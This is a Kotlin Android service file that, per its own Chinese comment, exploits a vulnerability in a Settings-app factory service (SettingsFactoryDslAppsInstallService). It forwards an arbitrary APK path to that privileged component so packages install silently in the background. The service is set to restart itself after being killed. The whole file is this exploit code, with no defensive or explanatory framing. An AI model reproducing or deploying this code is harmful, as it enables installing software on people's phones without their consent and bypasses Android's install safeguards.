package com.zaralyn.settings.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import android.widget.Toast

class BackgroundInstallService : Service() {
    
    companion object {
        private const val TAG = "BackgroundInstall"
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            val apkPath = it.getStringExtra("apk_path")
            if (!apkPath.isNullOrEmpty()) {
                installApk(apkPath)
            }
        }
        return START_STICKY
    }
    
    private fun installApk(apkPath: String) {
        try {
            // 利用 SettingsFactoryDslAppsInstallService 漏洞
            val serviceIntent = Intent().apply {
                setClassName("com.android.settings", "com.android.settings.SettingsFactoryDslAppsInstallService")
                putExtra("apk_path", apkPath)
            }
            startService(serviceIntent)
            Log.d(TAG, "启动后台安装: $apkPath")
        } catch (e: Exception) {
            Log.e(TAG, "安装失败", e)
        }
    }
}